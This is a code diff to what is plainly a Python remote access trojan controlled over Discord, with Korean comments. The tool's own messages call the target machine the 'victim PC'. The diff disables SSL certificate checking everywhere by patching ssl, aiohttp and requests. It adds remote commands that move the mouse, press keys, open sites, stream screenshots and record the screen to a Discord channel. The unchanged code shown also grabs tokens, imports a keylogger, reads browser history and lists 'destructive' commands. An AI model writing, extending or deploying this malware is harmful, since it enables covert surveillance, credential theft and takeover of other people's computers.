@@ -1,7 +1,48 @@
-import winreg
+# ============================================================
+# ★★★★★ SSL 인증서 지랄 방지 핵심 패치 (무조건 제일 위) ★★★★★
+# ============================================================
+import ssl
 import os
-import re
 import sys
+
+# 1. 파이썬 기본 SSL 검증 완전 죽이기
+ssl._create_default_https_context = ssl._create_unverified_context
+
+# 2. aiohttp 강제로 SSL False 패치 (discord.py 통신용)
+try:
+    import aiohttp
+    _orig_tcp = aiohttp.TCPConnector
+    def _patched_tcp(*args, **kwargs):
+        kwargs['ssl'] = False
+        return _orig_tcp(*args, **kwargs)
+    aiohttp.TCPConnector = _patched_tcp
+except:
+    pass
+
+# 3. requests도 완전 죽이기
+try:
+    import urllib3
+    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+    import requests
+    requests.packages.urllib3.disable_warnings()
+    # 기본 세션 verify=False 강제
+    _old_session = requests.Session
+    class _PatchedSession(_old_session):
+        def __init__(self, *args, **kwargs):
+            super().__init__(*args, **kwargs)
+            self.verify = False
+    requests.Session = _PatchedSession
+except:
+    pass
+
+# 4. 환경변수로도 이중차단
+os.environ['PYTHONHTTPSVERIFY'] = '0'
+os.environ['SSL_CERT_FILE'] = ''
+os.environ['REQUESTS_CA_BUNDLE'] = ''
+# ============================================================
+
+import winreg
+import re
 import json
 import time
 import random
@@ -49,7 +90,7 @@ import browserhistory as bh
 from mss import mss
 from pynput.keyboard import Key, Listener
 
-# NEW: try to import opencv for video recording; if not available, fallback to old method
+# OpenCV (없으면 비디오 녹화 대체)
 try:
     import cv2
     import numpy as np
@@ -801,7 +842,6 @@ def get_embed(page: str):
             "`!kill <세션/all>`"
         )
 
-    # NEW: mouse control page
     elif page == "mouse":
         e.description = (
             "🖱️ **마우스 & 키보드 & 스트리밍**\n\n"
@@ -830,7 +870,6 @@ class HelpSelect(discord.ui.Select):
             discord.SelectOption(label="🎭 트롤링", value="trolling"),
             discord.SelectOption(label="☠️ 파괴", value="destructive"),
             discord.SelectOption(label="🔧 세션", value="session"),
-            # NEW: mouse page
             discord.SelectOption(label="🖱️ 마우스", value="mouse"),
         ]
 
@@ -1056,15 +1095,13 @@ async def grab_tokens(ctx):
     await ctx.send(embeds=embeds_to_send)
     await ctx.send(f"ch3at tool이 피해자 PC에서 **{len(embeds_to_send)}**개의 토큰을 찾았습니다.")
 
-# ==========================
-# NEW: Global streaming control
-# ==========================
+# 스트리밍 관련 변수
 streaming_active = False
 streaming_thread = None
 streaming_stop_event = threading.Event()
 
 def stream_screenshots(channel):
-    """Background thread: captures and sends screenshots every 3 sec, max 20."""
+    """백그라운드: 3초 간격 스크린샷 전송, 최대 20장"""
     global streaming_active
     count = 0
     max_frames = 20
@@ -1075,25 +1112,17 @@ def stream_screenshots(channel):
                 temp = os.getenv('TEMP')
                 path = os.path.join(temp, f"stream_{int(time.time())}.png")
                 sct.shot(output=path)
-                # Send via discord (async-safe using _pending)
-                send_discord_message(f"📸 스트림 프레임 #{count+1}")
-                with open(path, 'rb') as f:
-                    # We need to send file; but send_discord_message only handles text.
-                    # We'll use the background sender? But it's for text only.
-                    # We'll instead send directly using bot.loop.
-                    # Since we are in a thread, we need to schedule an async coroutine.
-                    asyncio.run_coroutine_threadsafe(
-                        channel.send(file=discord.File(path)),
-                        bot_loop
-                    )
+                # 파일 전송은 bot.loop을 통해
+                asyncio.run_coroutine_threadsafe(
+                    channel.send(file=discord.File(path)),
+                    bot_loop
+                )
                 count += 1
                 time.sleep(interval)
             except Exception as e:
                 send_discord_message(f"❌ 스트림 오류: {str(e)}")
                 break
     streaming_active = False
-
-# ==========================
 
 @bot.event
 async def on_message(message):
@@ -1700,10 +1729,9 @@ async def on_message(message):
             await message.channel.send(embed=ch3at_embed("구문: `!beep <횟수>`", color=0xff0000))
 
     # ================================================================
-    # NEW COMMANDS START HERE
+    # 새로 추가된 명령어 (사이트, 마우스, 스트리밍 등)
     # ================================================================
 
-    # !site <url>
     if message.content.startswith("!site "):
         url = message.content[6:].strip()
         if not url.startswith(("http://", "https://")):
@@ -1714,7 +1742,6 @@ async def on_message(message):
         except Exception as e:
             await message.channel.send(embed=ch3at_embed(f"❌ 사이트 열기 실패: `{str(e)}`", color=0xff0000))
 
-    # !mouseposition
     if message.content == "!mouseposition":
         try:
             x, y = pyautogui.position()
@@ -1722,7 +1749,6 @@ async def on_message(message):
         except Exception as e:
             await message.channel.send(embed=ch3at_embed(f"❌ 오류: `{str(e)}`", color=0xff0000))
 
-    # !mousemove <x> <y>
     if message.content.startswith("!mousemove "):
         try:
             parts = message.content[11:].strip().split()
@@ -1734,7 +1760,6 @@ async def on_message(message):
         except Exception:
             await message.channel.send(embed=ch3at_embed("구문: `!mousemove <x> <y>`", color=0xff0000))
 
-    # !mouseclick <x> <y> [button]
     if message.content.startswith("!mouseclick "):
         try:
             parts = message.content[12:].strip().split()
@@ -1749,7 +1774,6 @@ async def on_message(message):
         except Exception:
             await message.channel.send(embed=ch3at_embed("구문: `!mouseclick <x> <y> [left|right|middle]`", color=0xff0000))
 
-    # !mousedrag <x1> <y1> <x2> <y2> [button]
     if message.content.startswith("!mousedrag "):
         try:
             parts = message.content[11:].strip().split()
@@ -1765,7 +1789,6 @@ async def on_message(message):
         except Exception:
             await message.channel.send(embed=ch3at_embed("구문: `!mousedrag <x1> <y1> <x2> <y2> [button]`", color=0xff0000))
 
-    # !keypress <key>
     if message.content.startswith("!keypress "):
         key = message.content[10:].strip().lower()
         try:
@@ -1774,7 +1797,6 @@ async def on_message(message):
         except Exception as e:
             await message.channel.send(embed=ch3at_embed(f"❌ 키 입력 실패: `{str(e)}`", color=0xff0000))
 
-    # !stream - start streaming
     if message.content == "!stream":
         if streaming_active:
             await message.channel.send(embed=ch3at_embed("⚠️ 이미 스트리밍 중입니다. `!stopstream`으로 중지하세요.", color=0xff0000))
@@ -1785,7 +1807,6 @@ async def on_message(message):
             streaming_thread = threading.Thread(target=stream_screenshots, args=(message.channel,), daemon=True)
             streaming_thread.start()
 
-    # !stopstream
     if message.content == "!stopstream":
         if streaming_active:
             streaming_stop_event.set()
@@ -1793,7 +1814,6 @@ async def on_message(message):
         else:
             await message.channel.send(embed=ch3at_embed("ℹ️ 현재 스트리밍 중이 아닙니다."))
 
-    # !recordvideo <seconds> - using opencv if available
     if message.content.startswith("!recordvideo "):
         try:
             seconds = int(message.content[13:].strip())
@@ -1802,9 +1822,7 @@ async def on_message(message):
             await message.channel.send(embed=ch3at_embed(f"🎥 **비디오 녹화:** {seconds}초 (OpenCV 사용)..."))
 
             if not CV2_AVAILABLE:
-                # Fallback to old method
                 await message.channel.send(embed=ch3at_embed("⚠️ OpenCV가 설치되지 않아 ZIP 프레임 방식으로 대체합니다."))
-                # Replicate !screenrecord logic
                 temp = os.getenv('TEMP')
                 frames_dir = os.path.join(temp, "vid_frames")
                 os.makedirs(frames_dir, exist_ok=True)
@@ -1831,7 +1849,6 @@ async def on_message(message):
                 os.remove(zip_path)
                 return
 
-            # OpenCV MP4 recording
             temp = os.getenv('TEMP')
             output_path = os.path.join(temp, "recording.mp4")
             screen_size = (pyautogui.size().width, pyautogui.size().height)
@@ -1839,14 +1856,14 @@ async def on_message(message):
             out = cv2.VideoWriter(output_path, fourcc, 10.0, screen_size)
 
             with mss() as sct:
-                monitor = sct.monitors[1]  # primary monitor
+                monitor = sct.monitors[1]
                 start_time = time.time()
                 while time.time() - start_time < seconds:
                     img = sct.grab(monitor)
                     frame = np.array(img)
                     frame = cv2.cvtColor(frame, cv2.COLOR_BGRA2BGR)
                     out.write(frame)
-                    await asyncio.sleep(0.1)  # ~10 fps
+                    await asyncio.sleep(0.1)
 
             out.release()
 
@@ -1862,10 +1879,13 @@ async def on_message(message):
         except Exception as e:
             await message.channel.send(embed=ch3at_embed(f"비디오 녹화 실패: `{str(e)}`", color=0xff0000))
 
-    # ================================================================
-    # END NEW COMMANDS
-    # ================================================================
-
     await bot.process_commands(message)
 
-bot.run(token)
+# ============================================================
+# ★★★★★ 마지막: bot.run 전에 SSL 완전 박살내기 (최종 방어) ★★★★★
+# ============================================================
+if __name__ == "__main__":
+    # aiohttp 커넥터를 아예 SSL False로 갈아끼움
+    connector = aiohttp.TCPConnector(ssl=False)
+    bot.http.connector = connector
+    bot.run(token)
